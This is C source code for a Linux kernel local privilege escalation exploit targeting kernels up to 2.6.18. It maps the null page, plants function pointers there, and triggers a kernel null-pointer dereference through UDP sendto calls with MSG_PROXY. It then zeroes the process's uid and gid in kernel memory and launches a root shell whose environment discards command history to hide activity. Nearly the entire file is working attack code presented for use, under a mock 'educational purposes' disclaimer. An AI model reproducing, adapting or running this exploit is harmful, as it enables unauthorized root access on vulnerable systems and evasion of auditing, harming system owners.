/****************************************************************************
 *                            .:: Katon ::.
 *
 *                   Linux up to 2.6.18 local root exploit
 *                              by teach
 *
 * VxHell Labs CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of VxHell Labs.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * his author. This includes especially the 
 * Bugtraq mailing list, the www.milw0rm.com website and any public exploit
 * archive.
 *
 * (C) COPYRIGHT teach, 09/09
 * All Rights Reserved
 *
 * teach@vxhell.org
 *
 * For [teh lullz and maybe] educational purposes. Use it at your own risk.
**
Tavis & Julien are indeed el8 :)
******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/personality.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#define THREAD_SIZE (8192)

static int uid, gid;

struct pwn_struct {
	int dummy[26];
	void *kaboom[10];
};

void error(char *s)
{
      printf("%s\n", s);
      exit(EXIT_FAILURE);
}

void escalate_priv(int thread)
{
      int i, *task = (int *)thread;
      
      for(i=0; i<0x500; i++)
      {
           if( (task[i] == uid) && (task[i+1] == uid) && (task[i+2] == uid) && (task[i+3] == uid) &&
               (task[i+4] == gid) && (task[i+5] == gid) && (task[i+6] == gid) && (task[i+7] == gid) )
           {
                  task[i] = 0;
                  task[i+1] = 0;
                  task[i+2] = 0;
                  task[i+3] = 0;
                  task[i+4] = 0;
                  task[i+5] = 0;
                  task[i+6] = 0;
                  task[i+7] = 0;
                  return;
           }
      }
}

void own_kernel_and_update_mah_credz()
{
	__asm__ __volatile__ (
	"pusha;"
      "movl %%esp, %%eax;"
      "andl %0, %%eax;"
      "movl (%%eax), %%eax;"
      "pushl %%eax;"
      "movl $escalate_priv, %%ebx;"
      "call *%%ebx;"
      "popl %%eax;"
      "popa;"
	:: "i" (~(THREAD_SIZE -1))
	);

}

char* get_null_page(void)
{
	char *page;
	if ((personality(0xffffffff)) != PER_SVR4) 
	{
		page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
		if (page != NULL) 
		{
			page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
			if (page != NULL) 
			{
				error("wtf? We have kernel <= 2.6.19 and this box haz a motherfuckin mmap_min_addr-like stuff! burn it if u can !@#*");
			}
		}
	      else 
	      {
		      if (mprotect(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
		      {
		            free(page);
			      error("HELL! can't mprotect my null page !@#*. goto /dev/null !");
			}
		}
	}
	else
	{
	      // may be we are lucky today ... :)
	      page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
		if (page != NULL) 
		{
			page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
			if (page != NULL) 
			{
				error("wtf? We have kernel <= 2.6.19 and this box haz a motherfuckin mmap_min_addr-like stuff! burn it if u can !@#*");
			}
		}
	      else 
	      {
		      if (mprotect(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) < 0) // ... or not ! :(
		      {
		            free(page);
			      error("HELL! can't mprotect my null page !@#*. goto /dev/null !");
			}
		}
	}
	return page;
}

void spawn_el8_shell(void) // sgrakkyu & twiz are el8 :))
{
      char *argv[] = { "/bin/sh", NULL };
      char *envp[] = { "TERM=linux", "PS1=root@pwn3d\\$ ", "BASH_HISTORY=/dev/null",
                   "HISTORY=/dev/null", "history=/dev/null",
                   "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };
      if(getuid() == 0) {
            printf("\t[+] G0tch4 r00t! Sucez moi!\n");
            execve("/bin/sh", argv, envp);
            error("hheeeehhh! unable to spawn a sh");
      }
      else
            printf("unable to get root. Kill yourself!\n");
}

int main(void)
{
      int i = 0, fd = socket(PF_INET, SOCK_DGRAM, 0);
      struct pwn_struct *pwn;
      char *page, buf[1024] = {0};
      struct sockaddr to = {
            .sa_family = AF_UNSPEC,
            .sa_data = "sucesucesucesu",
      };
      
      uid = getuid();
      gid = getgid();
      
      page = get_null_page();
      pwn = (struct pwn_struct *)page;
      
      for(i=0; i<10; i++)
		pwn->kaboom[i] = own_kernel_and_update_mah_credz;
      
      sendto(fd, buf, 1024, MSG_PROXY | MSG_MORE, &to, sizeof(to));
      sendto(fd, buf, 1024, 0, &to, sizeof(to));
     
      spawn_el8_shell(); // abracadabra...
      return 0; // hope we'll never hit this :p
}

